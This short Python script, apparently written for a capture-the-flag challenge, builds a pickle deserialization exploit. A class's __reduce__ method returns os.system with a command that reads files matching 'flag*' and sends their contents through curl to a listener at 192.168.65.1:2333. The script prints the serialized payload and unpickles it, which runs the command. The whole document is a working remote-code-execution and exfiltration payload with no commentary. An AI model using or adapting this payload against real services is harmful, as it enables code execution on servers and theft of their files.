import pickle
import os

class Test:
    def __reduce__(self):
        return(os.system,('curl http://192.168.65.1:2333/`cat flag*`',))

test = Test()
payload = pickle.dumps(test,0)
print(payload)
test_result = pickle.loads(payload)